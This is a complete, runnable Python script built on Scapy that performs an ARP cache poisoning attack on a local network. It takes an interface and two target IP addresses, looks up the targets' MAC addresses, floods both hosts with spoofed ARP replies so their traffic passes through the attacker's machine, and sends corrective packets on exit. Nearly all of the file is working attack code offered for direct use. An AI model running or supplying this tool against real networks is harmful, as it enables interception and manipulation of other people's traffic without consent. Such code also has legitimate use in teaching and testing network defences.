#!/usr/bin/env python3

'''
This script is for ARP cache poisoning attack
note : You have to run this script with root privileges
note : You should have enabled ip forwarding on your machine
'''

from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *
from argparse import ArgumentParser
from sys import argv

# class for arp spoof attack
class ArpSpoof:

    def __init__(self ,local_interface ,target1_ip ,target2_ip):
        self.local_interface = local_interface # interface using in the attack
        self.interface_mac = None
        self.target1_ip = target1_ip
        self.target2_ip = target2_ip
        self.target1_mac = None
        self.target2_mac = None

    def start(self):
        '''function to start attack'''

        print('Interface : ' + self.local_interface)
        self.get_local_mac() # get interface mac address

        # print mac address if the interface name is correct
        print('Interface mac : ' + self.interface_mac)

        self.get_targets_mac() # get targets mac addresses
        # print targets information
        print('Target 1 : ' + self.target1_ip)
        print('Target 1\'s mac : ' + self.target1_mac)
        print('Target 2 : ' + self.target2_ip)
        print('Target 2\'s mac : ' + self.target2_mac)

        self.poison_arp_cache()


    def get_local_mac(self):
        '''get interface mac from name of the interface'''

        try:
            self.interface_mac = get_if_hwaddr(self.local_interface)
        except ValueError :
            print('Invalid interface name --> ' + self.local_interface)
            exit()
        except OSError :
            print('Invalid interface name --> ' + self.local_interface)
            exit()

    def get_targets_mac(self):
        '''get targets mac by their ip address'''

        # get target 1 mac address
        try:
            self.target1_mac = getmacbyip(self.target1_ip)
            if self.target1_mac == None : # check if machine exists or responds to ARP request
                print('Target ' + self.target1_ip + ' didn\'t respond tp ARP request sent by machine')
                exit()

        except OSError :
            # ip validation
            print('Invalid IP address --> ' + self.target1_ip)
            exit()

        # get target 2 mac address
        try:
            self.target2_mac = getmacbyip(self.target2_ip)
            if self.target2_mac == None: # check if machine exists or responds to ARP request
                print('Target ' + self.target2_ip + ' didn\'t respond tp ARP request sent by machine')
                exit()

        except OSError :
            # ip validation
            print('Invalid IP address --> ' + self.target2_ip)
            exit()

    def poison_arp_cache(self):
        '''start poisoning the targets ARP caches'''

        while True :
            try :
                spoofed_arp_packet_target1 = ARP(op=2, psrc=self.target1_ip, pdst=self.target2_ip, hwdst=self.target2_mac ,hwsrc=self.interface_mac) # spoof target 1
                spoofed_arp_packet_target2 = ARP(op=2, psrc=self.target2_ip, pdst=self.target1_ip, hwdst=self.target1_mac ,hwsrc=self.interface_mac) # spoof target 2
                send(spoofed_arp_packet_target1 ,verbose=0)
                print('[ARP : ' + self.target1_ip + ' --> ' + self.target2_ip + ']--> mac : ' + self.interface_mac)
                send(spoofed_arp_packet_target2 ,verbose=0)
                print('[ARP : ' + self.target2_ip + ' --> ' + self.target1_ip + ']--> mac : ' + self.interface_mac)

            except KeyboardInterrupt :
                self.restore_arp_spoof()
                exit()


    def restore_arp_spoof(self):
        '''restore arp tables of the target machines'''

        print('\n')
        print('[Send last 2 ARP packets for restoring targets ARP tables] --> 5 times')
        arp_restore_packets = 5 # for sending 2 packets 5 times -> 2*5
        num = 0
        try:
            while arp_restore_packets != num :
                num += 1
                correct_arp_packet_target1 = ARP(op=2, psrc=self.target1_ip, pdst=self.target2_ip, hwdst=self.target2_mac, hwsrc=self.target1_mac) # restore mac table of target 2
                correct_arp_packet_target2 = ARP(op=2, psrc=self.target2_ip, pdst=self.target1_ip, hwdst=self.target1_mac, hwsrc=self.target2_mac) # restore mac table of target 1

                send(correct_arp_packet_target1 ,verbose=0)
                send(correct_arp_packet_target2 ,verbose=0)
        except:
            print('ARP cache restore failed !')
            exit()
        else:
            print('The attack has finished.')
            exit()



def print_parser_help():
    help_text = '''
    optional arguments:
  --script-help, -sh  Show This Help Message And Exit
  -i                  Interface Using In Attack
  -t1                 First Target For Attack
  -t2                 Second Target For Attack
    '''
    print(help_text)


# define parser and its arguments
parser = ArgumentParser(usage='sudo python3 %(prog)s --script acp.py [--script-help or -sh for help] [-i Interface] [-t1 TARGET 1] [-t2 TARGET 2]',allow_abbrev=False)

parser.add_argument('--script-help','-sh',help='Show Script Help',action='store_true')
parser.add_argument('-i',help='Interface Using In Attack',metavar='')
parser.add_argument('-t1',help='First Target For Attack',metavar='')
parser.add_argument('-t2',help='Second Target For Attack',metavar='')
args ,unknown = parser.parse_known_args()

if ((args.script_help is not None) and (args.script_help is True)):
    print_parser_help()

if (args.t1 != None) and (args.t2 != None) and (args.i != None): # check arguments
    pass
else:
    parser.print_usage() # print parser help
    exit()


arp_spoof = ArpSpoof(args.i ,args.t1 ,args.t2) # make an instance from ArpSpoof class
arp_spoof.start() # start attack